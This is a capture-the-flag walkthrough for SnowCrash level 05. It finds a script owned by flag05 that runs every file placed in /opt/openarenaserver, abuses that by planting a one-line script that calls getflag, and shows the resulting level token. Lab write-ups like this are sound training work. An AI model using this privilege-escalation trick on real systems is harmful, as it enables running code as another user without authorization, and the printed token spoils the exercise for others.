# Level 05

Level doesn't contain anything on the home folder, so enumerating files that belongs to flag05 we found the following:

```bash
level05@SnowCrash:~$ find / -user flag05 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

let's inspect the binary

```bash
level05@SnowCrash:~$ file /usr/sbin/openarenaserver
/usr/sbin/openarenaserver: POSIX shell script, ASCII text executable
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
level05@SnowCrash:~$
```

It looks like this script iterates through all files within the directory "/opt/openarenaserver/". For each file, it sets a maximum execution time limit of 5 seconds using "ulimit -t 5", then runs the file as a bash script with debugging enabled ("bash -x"). After execution, it removes the file. In summary, the script runs each file in the specified directory with a time limit of 5 seconds and deletes the file afterward which means any file we create in that directory will be executed as a bash script. let's create a script that executes getflag and wait for the cronjob? to run it

```bash
level05@SnowCrash:~$ echo 'getflag > /tmp/flag' > /opt/openarenaserver/flag.sh && chmod +x /opt/openarenaserver/flag.sh
```
now for the waiting part ...

and after a while we got the token !

```bash
level05@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
level05@SnowCrash:~$
```
